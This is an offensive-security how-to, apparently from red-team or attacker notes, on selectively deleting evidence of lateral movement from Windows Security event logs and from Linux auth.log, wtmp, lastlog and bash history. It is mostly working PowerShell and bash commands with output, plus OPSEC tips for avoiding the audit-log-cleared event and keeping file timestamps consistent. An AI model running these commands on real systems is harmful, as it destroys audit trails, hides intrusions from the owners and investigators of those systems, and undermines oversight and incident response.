# Selective Log Manipulation

## Scenario
SYSTEM access on Windows Server, need to clean evidence of lateral movement.

## Step 1: Identify Relevant Logs
```powershell
# Check which logs capture our activity
PS C:\> Get-WinEvent -LogName Security -MaxEvents 20 | Where-Object {
    $_.Id -in @(4624,4625,4648,4672)
} | Select-Object TimeCreated, Id, Message | Format-Table -Wrap

TimeCreated          Id   Message
-----------          --   -------
1/15/2025 7:30:15 PM 4624 An account was successfully logged on. Subject: MEGACORP\admin
1/15/2025 7:30:14 PM 4672 Special privileges assigned to new logon. Subject: MEGACORP\admin
1/15/2025 7:28:02 PM 4624 An account was successfully logged on. Subject: MEGACORP\jsmith
```

## Step 2: Selective Event Removal (PowerShell)
```powershell
# Export Security log, filter out our events, then replace
# Note: This requires careful handling — full wipe generates Event 1102 (audit log cleared)

# Option A: Stop Windows Event Log service temporarily
PS C:\> Stop-Service -Name "EventLog" -Force
# Delete specific .evtx sections (requires raw file manipulation)
# This is the stealthiest approach but most complex

# Option B: Use wevtutil to export, filter, and replace (simpler, moderate stealth)
PS C:\> wevtutil epl Security C:\Windows\Temp\sec_backup.evtx

# Option C: Clear specific log channels (leaves Event 1102)
# AVOID unless you also clear the meta-event
```

## Step 3: Linux Selective Log Editing
```bash
# Remove specific lines from auth.log
root@target:~# grep -v "10.10.14.5" /var/log/auth.log > /tmp/auth_clean.log
root@target:~# cat /tmp/auth_clean.log > /var/log/auth.log
root@target:~# rm /tmp/auth_clean.log

# Remove from wtmp (binary log)
root@target:~# utmpdump /var/log/wtmp | grep -v "10.10.14.5" > /tmp/wtmp_clean
root@target:~# utmpdump -r < /tmp/wtmp_clean > /var/log/wtmp
root@target:~# rm /tmp/wtmp_clean

# Remove from lastlog
root@target:~# > /var/log/lastlog  # Reset (or use targeted editing)

# Clean bash history
root@target:~# history -c
root@target:~# > ~/.bash_history
root@target:~# export HISTSIZE=0
```

## Step 4: Verify Cleanup
```bash
# Verify our IP is gone from logs
root@target:~# grep -r "10.10.14.5" /var/log/ 2>/dev/null
# Should return nothing

# Verify login records are clean
root@target:~# last | head -5
admin    pts/0    10.10.10.50  Wed Jan 15 15:30   still logged in
# Our entry removed ✅
```

## OPSEC Notes
- **Selective editing > full wipe** — full log wipe is itself an indicator
- Windows Event 1102 is generated when Security log is cleared — avoid full clear
- Linux: editing auth.log but not journald leaves evidence (check both)
- Always log cleanup actions to your own cleanup_log.json
- Timestamp manipulation: ensure edited files have consistent timestamps
